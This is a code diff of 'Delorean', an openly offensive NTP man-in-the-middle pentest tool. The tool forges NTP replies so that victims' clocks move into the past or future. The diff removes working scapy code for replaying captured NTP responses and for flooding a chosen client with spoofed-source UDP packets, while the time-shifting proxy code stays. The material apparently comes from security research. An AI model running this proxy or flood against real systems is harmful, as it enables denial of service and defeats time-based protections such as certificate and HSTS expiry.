@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 # NTP MitM Tool
 # Jose Selvi - jselvi[a.t]pentester[d0.t]es - http://www.pentester.es
-# Version 1.2 - 07/Aug/2015
-# 	- DEF CON.
+# Version 1.3 - 24/Jan/2016
+# 	- Remove unlikely attacks.
 
 # General Imports
 from optparse import OptionParser
@@ -16,13 +16,6 @@ import re
 import random
 import sys
 import os
-
-# Scapy imports
-import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)	# Avoid: WARNING: No route found for IPv6 destination :: (no default route?)
-import scapy.all as scapy
-from scapy.layers.inet import UDP
-from scapy.layers.ntp import NTP
 
 def banner():
 	print '                                    _._                                          '
@@ -49,13 +42,6 @@ class NTProxy( threading.Thread ):
 	forced_random  = False
 	# Temporal control
 	seen = {}
-	# Replay database
-	replay = {}
-	# Flood options
-	n_threads = 20
-	flood_ip = ''
-	flood_port = 0
-	flood_src = ''
 	# Constructor
 	def __init__( self, socket ):
 		threading.Thread.__init__( self )
@@ -90,14 +76,6 @@ class NTProxy( threading.Thread ):
 		self.forced_date = float(datetime.datetime.strptime(date, pat).strftime('%s'))
 	def force_random( self, random ):
 		self.forced_random = random
-
-	def add_replay( self, idx, data ):
-		self.replay[idx] = data
-	def search_replay( self, idx ):
-		if idx in self.replay:
-			return str(self.replay[idx])
-		else:
-			return None
 
 	# Set the step to the future/past
 	def select_step( self ):
@@ -138,40 +116,6 @@ class NTProxy( threading.Thread ):
 		else:
 			return skim_time
 
-	# Set flood ipport and spoofed source
-	def set_flood( self, ipport ):
-		if ':' in ipport:
-			self.flood_ip = ipport.split(':')[0]
-			self.flood_port = int(ipport.split(':')[1])
-		else:
-			self.flood_ip = ipport
-			self.flood_port = 0
-	def set_spoof( self, srcip ):
-		self.flood_src = srcip
-
-	# Floo Method
-	def flood( self ):
-		if self.flood_port == 0:
-			mydport = 123
-		else:
-			mydport = self.flood_port
-		if self.flood_src:
-			pkt = scapy.IP(src=self.flood_src,dst=self.flood_ip)/scapy.UDP(sport=123,dport=mydport)/self.replay.values()[0]
-		else:
-			pkt = scapy.IP(dst=self.flood_ip)/scapy.UDP(sport=123,dport=mydport)/self.replay.values()[0]
-		
-		print "Flooding to %s" % self.flood_ip
-		while not self.stopF:
-			threads = []
-			for i in range(self.n_threads):
-				t = threading.Thread(target=self.flood_sr1, args=(pkt,))
-				threads.append(t)
-				t.start()
-			t.join()
-	def flood_sr1( self, pkt ):
-		#scapy.send(pkt,verbose=False)
-		scapy.sr1(pkt, timeout=0.1, verbose=False, chainCC=1 )
-
 	# Stop Method
 	def stop( self ):
 		self.stopF = True
@@ -183,20 +127,12 @@ class NTProxy( threading.Thread ):
 			# When timeout we need to catch the exception
 			try:
 				data,source = self.socket.recvfrom(1024)
-				kid = self.get_kid( data )
-				if kid and self.search_replay( kid ):	# Key ID is present and we have it stored
-					action = "Replayed"	# Relayed packet
-					data = self.search_replay( kid )
-					info = self.extract( data )
-					timestamp = info['tx_timestamp'] - self.ntp_delta
-				else:
-					action = "Sent"		# Crafted packet
-					info = self.extract( data )
-					timestamp = self.newtime( info['tx_timestamp'] - self.ntp_delta )
-					fingerprint,data = self.response( info, timestamp )
-					if self.skim_step != 0:
-						for t in range(0, 10):
-							fingerprint,data = self.response( info, timestamp )
+				info = self.extract( data )
+				timestamp = self.newtime( info['tx_timestamp'] - self.ntp_delta )
+				fingerprint,data = self.response( info, timestamp )
+				if self.skim_step != 0:
+					for t in range(0, 10):
+						fingerprint,data = self.response( info, timestamp )
 				socket.sendto( data, source )
 				# Only print if it's the first packet
 				epoch_now = time.time()
@@ -214,7 +150,7 @@ class NTProxy( threading.Thread ):
 						when = "past"
 					else:
 						when = "future"
-					print "[%s] %s to %s:%d - Going to the %s! %s" % (current_time,action,source[0],source[1],when,future_time)
+					print "[%s] Sent to %s:%d - Going to the %s! %s" % (current_time,source[0],source[1],when,future_time)
 			except:
 				continue
 
@@ -243,13 +179,6 @@ class NTProxy( threading.Thread ):
 		info['tx_timestamp_low']	= unpacked[14]
 		# Return useful info for respose
 		return info		
-
-	# Extract Key ID from request
-	def get_kid( self, data ):
-		if len(data) < 52:	# No extensions
-			return 'NoKeyID'
-		else:			# Extract Key ID
-			return data[48:52].encode('hex')
 
 	# Create response packet
 	def response( self, info, timestamp ):
@@ -354,14 +283,10 @@ parser.add_option("-d", "--force-date",     type="string",        dest="date",  
 parser.add_option("-k", "--skim-step",      type="string",        dest="skim",                         help="Skimming step: 3m (minutes), 4d (days), 1M (month)")
 parser.add_option("-t", "--skim-threshold", type="string",        dest="threshold", default="30s",     help="Skimming Threshold: 3m (minutes), 4d (days), 1M (month)")
 parser.add_option("-x", "--random-date",    action="store_true",  dest="random",    default=False,     help="Use random date each time")
-parser.add_option("-r", "--replay",         type="string",        dest="replay",                       help="Replay given pcap file")
-parser.add_option("-f", "--flood",          type="string",        dest="flood",                        help="Client to flood responses")
-parser.add_option("-o", "--spoof",          type="string",        dest="spoof",                        help="IP address to spoof")
 (options, args) = parser.parse_args()
 ifre = re.compile('[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
 fsre = re.compile('[-]?[0-9]+[smhdwMy]?')
 fdre = re.compile('[0-9][0-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9] [0-9][0-9]:[0-9][0-9](:[0-9][0-9])?')
-flre = re.compile('[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(:[0-9]+)?')
 # Check options
 if (
 	not options.interface or not ifre.match(options.interface) or
@@ -371,10 +296,6 @@ if (
 	( options.random and (options.step or options.date) ) or
 	( options.step and not fsre.match(options.step) ) or
 	( options.date and not fdre.match(options.date) ) or
-	( options.spoof and not ifre.match(options.spoof) ) or
-	( options.spoof and not options.flood ) or
-	( options.flood and not options.replay ) or
-	( options.flood and not flre.match(options.flood) ) or
 	( options.skim and not fsre.match(options.skim) ) or
 	( options.threshold and not fsre.match(options.threshold) )
    ):
@@ -382,16 +303,13 @@ if (
         exit()
 
 # Check if root
-if (options.flood or options.port <= 1024) and os.geteuid() != 0:
-    sys.exit('Delorean must be run as root when binding ports under 1024 or using the flood option')
+if options.port <= 1024 and os.geteuid() != 0:
+    sys.exit('Delorean must be run as root when binding ports under 1024')
 
 # Bind Socket and Start Thread
-if options.flood:
-	NTP_Thread = NTProxy(None)
-else:
-	socket = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
-	socket.bind( (options.interface, options.port) )
-	NTP_Thread = NTProxy(socket)
+socket = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
+socket.bind( (options.interface, options.port) )
+NTP_Thread = NTProxy(socket)
 if options.random:
 	NTP_Thread.force_random(True)
 else:
@@ -402,25 +320,6 @@ else:
 		NTP_Thread.force_step( options.step )
 	if options.date:
 		NTP_Thread.force_date( options.date )
-if options.flood and options.spoof:
-	NTP_Thread.set_spoof( options.spoof )
-if options.replay:
-	#scapy.bind_layers(UDP, NTP(), {"sport":123})
-	#pkts = scapy.sniff(lfilter=lambda x: x.haslayer("NTP"),offline=options.replay)
-	pkts = scapy.sniff(filter='(udp and src port 123)',offline=options.replay)
-	for pkt in pkts:
-		pkt.getlayer(UDP).decode_payload_as(NTP)
-		mode = pkt.payload.payload.payload.mode
-		if mode == 4:   # NTP Response
-			ntp_pkt = pkt.payload.payload.payload
-			ntp_srv = pkt.payload.src
-			if pkt.payload.payload.payload.payload:
-				ntp_kid = str(pkt.payload.payload.payload.payload.load[0:4]).encode('hex')     
-			else:
-				ntp_kid = 'NoKeyID' # No Key ID
-			#ntp_idx = ntp_srv + '.' + ntp_kid
-			ntp_idx = ntp_kid
-			NTP_Thread.add_replay( ntp_idx, ntp_pkt )
 
 # Lets go to the future
 if options.banner:
@@ -428,18 +327,13 @@ if options.banner:
 
 # Wait until Keyboard Interrupt
 try:
-	if options.flood:
-		NTP_Thread.set_flood(options.flood)
-		NTP_Thread.flood()
-	else:
-		NTP_Thread.start()
+	NTP_Thread.start()
 	while True:
 		time.sleep(1)
 except KeyboardInterrupt:
 	print "Kill signal sent..."
 	NTP_Thread.stop()
-	if not options.flood:
-		NTP_Thread.join()
-		socket.close()
+	NTP_Thread.join()
+	socket.close()
 	print "Exited"
 
